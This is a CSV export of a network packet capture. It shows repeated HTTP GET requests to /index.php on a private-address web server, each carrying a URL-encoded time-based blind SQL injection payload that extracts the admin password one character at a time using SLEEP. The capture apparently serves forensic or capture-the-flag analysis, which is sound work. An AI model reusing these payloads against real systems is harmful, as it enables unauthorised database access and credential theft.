"No","Time","Source","Destination","Protocol","Length","Info"
"12193","133.888326472","150.95.139.51","192.168.1.2","TCP","74","35772  >  80 [SYN] Seq=0 Win=29200 Len=0 MSS=1412 SACK_PERM=1 TSval=3262551457 TSecr=0 WS=128"
"12194","133.888392296","192.168.1.2","150.95.139.51","TCP","74","80  >  35772 [SYN, ACK] Seq=0 Ack=1 Win=28960 Len=0 MSS=1460 SACK_PERM=1 TSval=2793025904 TSecr=3262551457 WS=128"
"12195","133.889623806","150.95.139.51","192.168.1.2","TCP","66","35770  >  80 [ACK] Seq=366 Ack=619 Win=30464 Len=0 TSval=3262551459 TSecr=2793025901"
"12196","133.892011581","150.95.139.51","192.168.1.2","TCP","66","35772  >  80 [ACK] Seq=1 Ack=1 Win=29312 Len=0 TSval=3262551461 TSecr=2793025904"
"12197","133.892836999","150.95.139.51","192.168.1.2","HTTP","430","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D109%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12198","133.892904111","192.168.1.2","150.95.139.51","TCP","66","80  >  35772 [ACK] Seq=1 Ack=365 Win=30080 Len=0 TSval=2793025908 TSecr=3262551461"
"12199","133.895619488","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12200","133.902442642","150.95.139.51","192.168.1.2","TCP","66","35772  >  80 [ACK] Seq=365 Ack=618 Win=30464 Len=0 TSval=3262551471 TSecr=2793025911"
"12201","133.902759726","150.95.139.51","192.168.1.2","TCP","66","35772  >  80 [FIN, ACK] Seq=365 Ack=618 Win=30464 Len=0 TSval=3262551472 TSecr=2793025911"
"12202","133.902916968","192.168.1.2","150.95.139.51","TCP","66","80  >  35772 [FIN, ACK] Seq=618 Ack=366 Win=30080 Len=0 TSval=2793025918 TSecr=3262551472"
"12203","133.905115546","150.95.139.51","192.168.1.2","TCP","74","35774  >  80 [SYN] Seq=0 Win=29200 Len=0 MSS=1412 SACK_PERM=1 TSval=3262551474 TSecr=0 WS=128"
"12204","133.905165726","192.168.1.2","150.95.139.51","TCP","74","80  >  35774 [SYN, ACK] Seq=0 Ack=1 Win=28960 Len=0 MSS=1460 SACK_PERM=1 TSval=2793025920 TSecr=3262551474 WS=128"
"12205","133.906412377","150.95.139.51","192.168.1.2","TCP","66","35772  >  80 [ACK] Seq=366 Ack=619 Win=30464 Len=0 TSval=3262551476 TSecr=2793025918"
"12206","133.908774563","150.95.139.51","192.168.1.2","TCP","66","35774  >  80 [ACK] Seq=1 Ack=1 Win=29312 Len=0 TSval=3262551478 TSecr=2793025920"
"12207","133.909122514","150.95.139.51","192.168.1.2","HTTP","430","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D110%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12208","133.909178386","192.168.1.2","150.95.139.51","TCP","66","80  >  35774 [ACK] Seq=1 Ack=365 Win=30080 Len=0 TSval=2793025924 TSecr=3262551478"
"12209","133.911859838","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12210","133.916577152","150.95.139.51","192.168.1.2","TCP","66","35774  >  80 [ACK] Seq=365 Ack=618 Win=30464 Len=0 TSval=3262551485 TSecr=2793025927"
"12211","133.916608539","150.95.139.51","192.168.1.2","TCP","66","35774  >  80 [FIN, ACK] Seq=365 Ack=618 Win=30464 Len=0 TSval=3262551486 TSecr=2793025927"
"12212","133.916746233","192.168.1.2","150.95.139.51","TCP","66","80  >  35774 [FIN, ACK] Seq=618 Ack=366 Win=30080 Len=0 TSval=2793025932 TSecr=3262551486"
"12213","133.920063998","150.95.139.51","192.168.1.2","TCP","74","35776  >  80 [SYN] Seq=0 Win=29200 Len=0 MSS=1412 SACK_PERM=1 TSval=3262551489 TSecr=0 WS=128"
"12214","133.920112380","192.168.1.2","150.95.139.51","TCP","74","80  >  35776 [SYN, ACK] Seq=0 Ack=1 Win=28960 Len=0 MSS=1460 SACK_PERM=1 TSval=2793025935 TSecr=3262551489 WS=128"
"12215","133.921031523","150.95.139.51","192.168.1.2","TCP","66","35774  >  80 [ACK] Seq=366 Ack=619 Win=30464 Len=0 TSval=3262551490 TSecr=2793025932"
"12216","133.924275178","150.95.139.51","192.168.1.2","TCP","66","35776  >  80 [ACK] Seq=1 Ack=1 Win=29312 Len=0 TSval=3262551493 TSecr=2793025935"
"12217","133.924344431","150.95.139.51","192.168.1.2","HTTP","430","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D111%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12218","133.924401655","192.168.1.2","150.95.139.51","TCP","66","80  >  35776 [ACK] Seq=1 Ack=365 Win=30080 Len=0 TSval=2793025940 TSecr=3262551493"
"12219","133.927132598","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12220","133.931040010","150.95.139.51","192.168.1.2","TCP","66","35776  >  80 [ACK] Seq=365 Ack=618 Win=30464 Len=0 TSval=3262551500 TSecr=2793025942"
"12221","133.931640566","150.95.139.51","192.168.1.2","TCP","66","35776  >  80 [FIN, ACK] Seq=365 Ack=618 Win=30464 Len=0 TSval=3262551501 TSecr=2793025942"
"12222","133.931796876","192.168.1.2","150.95.139.51","TCP","66","80  >  35776 [FIN, ACK] Seq=618 Ack=366 Win=30080 Len=0 TSval=2793025947 TSecr=3262551501"
"12223","133.934337071","150.95.139.51","192.168.1.2","TCP","74","35778  >  80 [SYN] Seq=0 Win=29200 Len=0 MSS=1412 SACK_PERM=1 TSval=3262551503 TSecr=0 WS=128"
"12224","133.934386180","192.168.1.2","150.95.139.51","TCP","74","80  >  35778 [SYN, ACK] Seq=0 Ack=1 Win=28960 Len=0 MSS=1460 SACK_PERM=1 TSval=2793025950 TSecr=3262551503 WS=128"
"12225","133.935479387","150.95.139.51","192.168.1.2","TCP","66","35776  >  80 [ACK] Seq=366 Ack=619 Win=30464 Len=0 TSval=3262551505 TSecr=2793025947"
"12226","133.938178285","150.95.139.51","192.168.1.2","TCP","66","35778  >  80 [ACK] Seq=1 Ack=1 Win=29312 Len=0 TSval=3262551507 TSecr=2793025950"
"12227","133.938476625","150.95.139.51","192.168.1.2","HTTP","430","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D112%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12228","133.938542242","192.168.1.2","150.95.139.51","TCP","66","80  >  35778 [ACK] Seq=1 Ack=365 Win=30080 Len=0 TSval=2793025954 TSecr=3262551507"
"12229","133.941299042","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12230","133.944816704","150.95.139.51","192.168.1.2","TCP","66","35778  >  80 [ACK] Seq=365 Ack=618 Win=30464 Len=0 TSval=3262551514 TSecr=2793025957"
"12231","133.945709530","150.95.139.51","192.168.1.2","TCP","66","35778  >  80 [FIN, ACK] Seq=365 Ack=618 Win=30464 Len=0 TSval=3262551515 TSecr=2793025957"
"12232","133.945864025","192.168.1.2","150.95.139.51","TCP","66","80  >  35778 [FIN, ACK] Seq=618 Ack=366 Win=30080 Len=0 TSval=2793025961 TSecr=3262551515"
"12233","133.948282271","150.95.139.51","192.168.1.2","TCP","74","35780  >  80 [SYN] Seq=0 Win=29200 Len=0 MSS=1412 SACK_PERM=1 TSval=3262551517 TSecr=0 WS=128"
"12234","133.948330258","192.168.1.2","150.95.139.51","TCP","74","80  >  35780 [SYN, ACK] Seq=0 Ack=1 Win=28960 Len=0 MSS=1460 SACK_PERM=1 TSval=2793025964 TSecr=3262551517 WS=128"
"12235","133.949450697","150.95.139.51","192.168.1.2","TCP","66","35778  >  80 [ACK] Seq=366 Ack=619 Win=30464 Len=0 TSval=3262551519 TSecr=2793025961"
"12236","133.956844514","150.95.139.51","192.168.1.2","TCP","66","35780  >  80 [ACK] Seq=1 Ack=1 Win=29312 Len=0 TSval=3262551521 TSecr=2793025964"
"12237","133.957026233","150.95.139.51","192.168.1.2","HTTP","430","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D113%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12238","133.957083937","192.168.1.2","150.95.139.51","TCP","66","80  >  35780 [ACK] Seq=1 Ack=365 Win=30080 Len=0 TSval=2793025972 TSecr=3262551521"
"12239","133.959795266","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12240","133.964084597","150.95.139.51","192.168.1.2","TCP","66","35780  >  80 [ACK] Seq=365 Ack=618 Win=30464 Len=0 TSval=3262551533 TSecr=2793025975"
"12241","133.964563979","150.95.139.51","192.168.1.2","TCP","66","35780  >  80 [FIN, ACK] Seq=365 Ack=618 Win=30464 Len=0 TSval=3262551534 TSecr=2793025975"
"12242","133.964715260","192.168.1.2","150.95.139.51","TCP","66","80  >  35780 [FIN, ACK] Seq=618 Ack=366 Win=30080 Len=0 TSval=2793025980 TSecr=3262551534"
"12243","133.966910969","150.95.139.51","192.168.1.2","TCP","74","35782  >  80 [SYN] Seq=0 Win=29200 Len=0 MSS=1412 SACK_PERM=1 TSval=3262551536 TSecr=0 WS=128"
"12244","133.966962017","192.168.1.2","150.95.139.51","TCP","74","80  >  35782 [SYN, ACK] Seq=0 Ack=1 Win=28960 Len=0 MSS=1460 SACK_PERM=1 TSval=2793025982 TSecr=3262551536 WS=128"
"12245","133.968704450","150.95.139.51","192.168.1.2","TCP","66","35780  >  80 [ACK] Seq=366 Ack=619 Win=30464 Len=0 TSval=3262551538 TSecr=2793025980"
"12246","133.970941060","150.95.139.51","192.168.1.2","TCP","66","35782  >  80 [ACK] Seq=1 Ack=1 Win=29312 Len=0 TSval=3262551540 TSecr=2793025982"
"12247","133.971012368","150.95.139.51","192.168.1.2","HTTP","430","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D114%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12248","133.971061407","192.168.1.2","150.95.139.51","TCP","66","80  >  35782 [ACK] Seq=1 Ack=365 Win=30080 Len=0 TSval=2793025986 TSecr=3262551540"
"12249","133.973733181","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12250","133.977688850","150.95.139.51","192.168.1.2","TCP","66","35782  >  80 [ACK] Seq=365 Ack=618 Win=30464 Len=0 TSval=3262551547 TSecr=2793025989"
"12251","133.978313835","150.95.139.51","192.168.1.2","TCP","66","35782  >  80 [FIN, ACK] Seq=365 Ack=618 Win=30464 Len=0 TSval=3262551547 TSecr=2793025989"
"12252","133.978427815","192.168.1.2","150.95.139.51","TCP","66","80  >  35782 [FIN, ACK] Seq=618 Ack=366 Win=30080 Len=0 TSval=2793025994 TSecr=3262551547"
"12253","133.979948073","150.95.139.51","192.168.1.2","TCP","74","35784  >  80 [SYN] Seq=0 Win=29200 Len=0 MSS=1412 SACK_PERM=1 TSval=3262551549 TSecr=0 WS=128"
"12254","133.979996374","192.168.1.2","150.95.139.51","TCP","74","80  >  35784 [SYN, ACK] Seq=0 Ack=1 Win=28960 Len=0 MSS=1460 SACK_PERM=1 TSval=2793025995 TSecr=3262551549 WS=128"
"12255","133.983759107","150.95.139.51","192.168.1.2","TCP","66","35782  >  80 [ACK] Seq=366 Ack=619 Win=30464 Len=0 TSval=3262551551 TSecr=2793025994"
"12256","133.983813938","150.95.139.51","192.168.1.2","TCP","66","35784  >  80 [ACK] Seq=1 Ack=1 Win=29312 Len=0 TSval=3262551553 TSecr=2793025995"
"12257","133.983829479","150.95.139.51","192.168.1.2","HTTP","430","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D115%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12258","133.983869387","192.168.1.2","150.95.139.51","TCP","66","80  >  35784 [ACK] Seq=1 Ack=365 Win=30080 Len=0 TSval=2793025999 TSecr=3262551553"
"12259","133.986635297","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12260","133.990467247","150.95.139.51","192.168.1.2","TCP","66","35784  >  80 [ACK] Seq=365 Ack=618 Win=30464 Len=0 TSval=3262551560 TSecr=2793026002"
"12261","133.990794134","150.95.139.51","192.168.1.2","TCP","66","35784  >  80 [FIN, ACK] Seq=365 Ack=618 Win=30464 Len=0 TSval=3262551560 TSecr=2793026002"
"12262","133.990951464","192.168.1.2","150.95.139.51","TCP","66","80  >  35784 [FIN, ACK] Seq=618 Ack=366 Win=30080 Len=0 TSval=2793026006 TSecr=3262551560"
"12263","133.992916957","150.95.139.51","192.168.1.2","TCP","74","35786  >  80 [SYN] Seq=0 Win=29200 Len=0 MSS=1412 SACK_PERM=1 TSval=3262551562 TSecr=0 WS=128"
"12264","133.992967509","192.168.1.2","150.95.139.51","TCP","74","80  >  35786 [SYN, ACK] Seq=0 Ack=1 Win=28960 Len=0 MSS=1460 SACK_PERM=1 TSval=2793026008 TSecr=3262551562 WS=128"
"12265","133.994797267","150.95.139.51","192.168.1.2","TCP","66","35784  >  80 [ACK] Seq=366 Ack=619 Win=30464 Len=0 TSval=3262551564 TSecr=2793026006"
"12266","133.996766788","150.95.139.51","192.168.1.2","TCP","66","35786  >  80 [ACK] Seq=1 Ack=1 Win=29312 Len=0 TSval=3262551566 TSecr=2793026008"
"12267","133.997145359","150.95.139.51","192.168.1.2","HTTP","430","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D116%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12268","133.997211256","192.168.1.2","150.95.139.51","TCP","66","80  >  35786 [ACK] Seq=1 Ack=365 Win=30080 Len=0 TSval=2793026013 TSecr=3262551566"
"12269","133.999943336","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12270","134.004537911","150.95.139.51","192.168.1.2","TCP","66","35786  >  80 [ACK] Seq=365 Ack=618 Win=30464 Len=0 TSval=3262551574 TSecr=2793026015"
"12271","134.004893500","150.95.139.51","192.168.1.2","TCP","66","35786  >  80 [FIN, ACK] Seq=365 Ack=618 Win=30464 Len=0 TSval=3262551574 TSecr=2793026015"
"12272","134.005048623","192.168.1.2","150.95.139.51","TCP","66","80  >  35786 [FIN, ACK] Seq=618 Ack=366 Win=30080 Len=0 TSval=2793026020 TSecr=3262551574"
"12273","134.007403729","150.95.139.51","192.168.1.2","TCP","74","35788  >  80 [SYN] Seq=0 Win=29200 Len=0 MSS=1412 SACK_PERM=1 TSval=3262551576 TSecr=0 WS=128"
"12274","134.007453939","192.168.1.2","150.95.139.51","TCP","74","80  >  35788 [SYN, ACK] Seq=0 Ack=1 Win=28960 Len=0 MSS=1460 SACK_PERM=1 TSval=2793026023 TSecr=3262551576 WS=128"
"12275","134.008572668","150.95.139.51","192.168.1.2","TCP","66","35786  >  80 [ACK] Seq=366 Ack=619 Win=30464 Len=0 TSval=3262551578 TSecr=2793026020"
"12276","134.011455269","150.95.139.51","192.168.1.2","TCP","66","35788  >  80 [ACK] Seq=1 Ack=1 Win=29312 Len=0 TSval=3262551580 TSecr=2793026023"
"12277","134.011649609","150.95.139.51","192.168.1.2","HTTP","430","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D117%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12278","134.011716125","192.168.1.2","150.95.139.51","TCP","66","80  >  35788 [ACK] Seq=1 Ack=365 Win=30080 Len=0 TSval=2793026027 TSecr=3262551580"
"12279","134.014433685","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12280","134.018859199","150.95.139.51","192.168.1.2","TCP","66","35788  >  80 [ACK] Seq=365 Ack=618 Win=30464 Len=0 TSval=3262551588 TSecr=2793026030"
"12281","134.018981145","150.95.139.51","192.168.1.2","TCP","66","35788  >  80 [FIN, ACK] Seq=365 Ack=618 Win=30464 Len=0 TSval=3262551588 TSecr=2793026030"
"12282","134.019120823","192.168.1.2","150.95.139.51","TCP","66","80  >  35788 [FIN, ACK] Seq=618 Ack=366 Win=30080 Len=0 TSval=2793026034 TSecr=3262551588"
"12283","134.021332451","150.95.139.51","192.168.1.2","TCP","74","35790  >  80 [SYN] Seq=0 Win=29200 Len=0 MSS=1412 SACK_PERM=1 TSval=3262551590 TSecr=0 WS=128"
"12284","134.021381902","192.168.1.2","150.95.139.51","TCP","74","80  >  35790 [SYN, ACK] Seq=0 Ack=1 Win=28960 Len=0 MSS=1460 SACK_PERM=1 TSval=2793026037 TSecr=3262551590 WS=128"
"12285","134.022863395","150.95.139.51","192.168.1.2","TCP","66","35788  >  80 [ACK] Seq=366 Ack=619 Win=30464 Len=0 TSval=3262551592 TSecr=2793026034"
"12286","134.025236856","150.95.139.51","192.168.1.2","TCP","66","35790  >  80 [ACK] Seq=1 Ack=1 Win=29312 Len=0 TSval=3262551594 TSecr=2793026037"
"12287","134.025651450","150.95.139.51","192.168.1.2","HTTP","430","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D118%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12288","134.025716468","192.168.1.2","150.95.139.51","TCP","66","80  >  35790 [ACK] Seq=1 Ack=365 Win=30080 Len=0 TSval=2793026041 TSecr=3262551595"
"12289","134.028474256","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12290","134.032414358","150.95.139.51","192.168.1.2","TCP","66","35790  >  80 [ACK] Seq=365 Ack=618 Win=30464 Len=0 TSval=3262551602 TSecr=2793026044"
"12291","134.032880018","150.95.139.51","192.168.1.2","TCP","66","35790  >  80 [FIN, ACK] Seq=365 Ack=618 Win=30464 Len=0 TSval=3262551602 TSecr=2793026044"
"12292","134.033035234","192.168.1.2","150.95.139.51","TCP","66","80  >  35790 [FIN, ACK] Seq=618 Ack=366 Win=30080 Len=0 TSval=2793026048 TSecr=3262551602"
"12293","134.035315024","150.95.139.51","192.168.1.2","TCP","74","35792  >  80 [SYN] Seq=0 Win=29200 Len=0 MSS=1412 SACK_PERM=1 TSval=3262551604 TSecr=0 WS=128"
"12294","134.035364861","192.168.1.2","150.95.139.51","TCP","74","80  >  35792 [SYN, ACK] Seq=0 Ack=1 Win=28960 Len=0 MSS=1460 SACK_PERM=1 TSval=2793026051 TSecr=3262551604 WS=128"
"12295","134.036643358","150.95.139.51","192.168.1.2","TCP","66","35790  >  80 [ACK] Seq=366 Ack=619 Win=30464 Len=0 TSval=3262551606 TSecr=2793026048"
"12296","134.039317298","150.95.139.51","192.168.1.2","TCP","66","35792  >  80 [ACK] Seq=1 Ack=1 Win=29312 Len=0 TSval=3262551608 TSecr=2793026051"
"12297","134.039479411","150.95.139.51","192.168.1.2","HTTP","430","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D119%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12298","134.039535853","192.168.1.2","150.95.139.51","TCP","66","80  >  35792 [ACK] Seq=1 Ack=365 Win=30080 Len=0 TSval=2793026055 TSecr=3262551608"
"12299","134.042283630","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12300","134.046041220","150.95.139.51","192.168.1.2","TCP","66","35792  >  80 [ACK] Seq=365 Ack=618 Win=30464 Len=0 TSval=3262551615 TSecr=2793026058"
"12301","134.046518936","150.95.139.51","192.168.1.2","TCP","66","35792  >  80 [FIN, ACK] Seq=365 Ack=618 Win=30464 Len=0 TSval=3262551616 TSecr=2793026058"
"12302","134.046675199","192.168.1.2","150.95.139.51","TCP","66","80  >  35792 [FIN, ACK] Seq=618 Ack=366 Win=30080 Len=0 TSval=2793026062 TSecr=3262551616"
"12303","134.050126148","150.95.139.51","192.168.1.2","TCP","74","35794  >  80 [SYN] Seq=0 Win=29200 Len=0 MSS=1412 SACK_PERM=1 TSval=3262551618 TSecr=0 WS=128"
"12304","134.050175598","192.168.1.2","150.95.139.51","TCP","74","80  >  35794 [SYN, ACK] Seq=0 Ack=1 Win=28960 Len=0 MSS=1460 SACK_PERM=1 TSval=2793026066 TSecr=3262551618 WS=128"
"12305","134.050288422","150.95.139.51","192.168.1.2","TCP","66","35792  >  80 [ACK] Seq=366 Ack=619 Win=30464 Len=0 TSval=3262551619 TSecr=2793026062"
"12306","134.057467768","150.95.139.51","192.168.1.2","TCP","66","35794  >  80 [ACK] Seq=1 Ack=1 Win=29312 Len=0 TSval=3262551623 TSecr=2793026066"
"12307","134.057954184","150.95.139.51","192.168.1.2","HTTP","430","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D120%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12308","134.058020198","192.168.1.2","150.95.139.51","TCP","66","80  >  35794 [ACK] Seq=1 Ack=365 Win=30080 Len=0 TSval=2793026073 TSecr=3262551623"
"12309","134.060795874","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12310","134.064847457","150.95.139.51","192.168.1.2","TCP","66","35794  >  80 [ACK] Seq=365 Ack=618 Win=30464 Len=0 TSval=3262551634 TSecr=2793026076"
"12311","134.065201263","150.95.139.51","192.168.1.2","TCP","66","35794  >  80 [FIN, ACK] Seq=365 Ack=618 Win=30464 Len=0 TSval=3262551635 TSecr=2793026076"
"12312","134.065358957","192.168.1.2","150.95.139.51","TCP","66","80  >  35794 [FIN, ACK] Seq=618 Ack=366 Win=30080 Len=0 TSval=2793026081 TSecr=3262551635"
"12313","134.067644218","150.95.139.51","192.168.1.2","TCP","74","35796  >  80 [SYN] Seq=0 Win=29200 Len=0 MSS=1412 SACK_PERM=1 TSval=3262551637 TSecr=0 WS=128"
"12314","134.067693045","192.168.1.2","150.95.139.51","TCP","74","80  >  35796 [SYN, ACK] Seq=0 Ack=1 Win=28960 Len=0 MSS=1460 SACK_PERM=1 TSval=2793026083 TSecr=3262551637 WS=128"
"12315","134.068805540","150.95.139.51","192.168.1.2","TCP","66","35794  >  80 [ACK] Seq=366 Ack=619 Win=30464 Len=0 TSval=3262551638 TSecr=2793026081"
"12316","134.071885349","150.95.139.51","192.168.1.2","TCP","66","35796  >  80 [ACK] Seq=1 Ack=1 Win=29312 Len=0 TSval=3262551641 TSecr=2793026083"
"12317","134.071956127","150.95.139.51","192.168.1.2","HTTP","430","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D121%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12318","134.072004355","192.168.1.2","150.95.139.51","TCP","66","80  >  35796 [ACK] Seq=1 Ack=365 Win=30080 Len=0 TSval=2793026087 TSecr=3262551641"
"12319","134.074747468","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12320","134.078761123","150.95.139.51","192.168.1.2","TCP","66","35796  >  80 [ACK] Seq=365 Ack=618 Win=30464 Len=0 TSval=3262551648 TSecr=2793026090"
"12321","134.079188414","150.95.139.51","192.168.1.2","TCP","66","35796  >  80 [FIN, ACK] Seq=365 Ack=618 Win=30464 Len=0 TSval=3262551648 TSecr=2793026090"
"12322","134.079342850","192.168.1.2","150.95.139.51","TCP","66","80  >  35796 [FIN, ACK] Seq=618 Ack=366 Win=30080 Len=0 TSval=2793026095 TSecr=3262551648"
"12323","134.081410688","150.95.139.51","192.168.1.2","TCP","74","35798  >  80 [SYN] Seq=0 Win=29200 Len=0 MSS=1412 SACK_PERM=1 TSval=3262551651 TSecr=0 WS=128"
"12324","134.081449910","192.168.1.2","150.95.139.51","TCP","74","80  >  35798 [SYN, ACK] Seq=0 Ack=1 Win=28960 Len=0 MSS=1460 SACK_PERM=1 TSval=2793026097 TSecr=3262551651 WS=128"
"12325","134.082982396","150.95.139.51","192.168.1.2","TCP","66","35796  >  80 [ACK] Seq=366 Ack=619 Win=30464 Len=0 TSval=3262551652 TSecr=2793026095"
"12326","134.086319732","150.95.139.51","192.168.1.2","TCP","66","35798  >  80 [ACK] Seq=1 Ack=1 Win=29312 Len=0 TSval=3262551654 TSecr=2793026097"
"12327","134.086470167","150.95.139.51","192.168.1.2","HTTP","430","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D122%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12328","134.086525791","192.168.1.2","150.95.139.51","TCP","66","80  >  35798 [ACK] Seq=1 Ack=365 Win=30080 Len=0 TSval=2793026102 TSecr=3262551655"
"12329","134.089270623","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12330","134.092816060","150.95.139.51","192.168.1.2","TCP","66","35798  >  80 [ACK] Seq=365 Ack=618 Win=30464 Len=0 TSval=3262551662 TSecr=2793026105"
"12331","134.093630386","150.95.139.51","192.168.1.2","TCP","66","35798  >  80 [FIN, ACK] Seq=365 Ack=618 Win=30464 Len=0 TSval=3262551663 TSecr=2793026105"
"12332","134.093787143","192.168.1.2","150.95.139.51","TCP","66","80  >  35798 [FIN, ACK] Seq=618 Ack=366 Win=30080 Len=0 TSval=2793026109 TSecr=3262551663"
"12333","134.096079270","150.95.139.51","192.168.1.2","TCP","74","35800  >  80 [SYN] Seq=0 Win=29200 Len=0 MSS=1412 SACK_PERM=1 TSval=3262551665 TSecr=0 WS=128"
"12334","134.096128873","192.168.1.2","150.95.139.51","TCP","74","80  >  35800 [SYN, ACK] Seq=0 Ack=1 Win=28960 Len=0 MSS=1460 SACK_PERM=1 TSval=2793026112 TSecr=3262551665 WS=128"
"12335","134.097272633","150.95.139.51","192.168.1.2","TCP","66","35798  >  80 [ACK] Seq=366 Ack=619 Win=30464 Len=0 TSval=3262551667 TSecr=2793026109"
"12336","134.100235011","150.95.139.51","192.168.1.2","TCP","66","35800  >  80 [ACK] Seq=1 Ack=1 Win=29312 Len=0 TSval=3262551669 TSecr=2793026112"
"12337","134.100303064","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D65%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
